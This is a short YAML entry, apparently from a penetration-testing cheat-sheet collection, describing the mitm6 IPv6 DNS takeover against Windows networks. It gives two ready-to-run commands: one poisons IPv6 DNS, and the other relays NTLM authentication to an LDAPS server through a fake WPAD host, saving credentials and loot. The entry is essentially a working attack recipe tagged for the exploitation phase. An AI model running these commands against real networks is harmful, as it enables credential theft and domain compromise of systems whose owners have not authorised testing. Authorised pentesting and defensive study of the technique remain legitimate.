---
description: |
  mitm6 IPv6 DNS takeover — abuse Windows default IPv6 configuration to intercept DHCP/WPAD requests and relay NTLM authentication to LDAP for credential theft or machine account creation.
commands:
  - have: No_Creds
    cmd: |
      # Terminal 1 — poison IPv6 DNS
      mitm6 -d senshu.sh

      # Terminal 2 — relay to LDAP (results saved in loot/)
      ntlmrelayx.py -6 -t ldaps://10.10.10.27 -wh fakewpad.senshu.sh -l loot
phase:
  - Exploitation
target_os:
  - Windows
services:
  - LDAP
techniques:
  - NTLM_Relay
references:
  - https://github.com/dirkjanm/mitm6
  - https://github.com/fortra/impacket
  - https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html
---
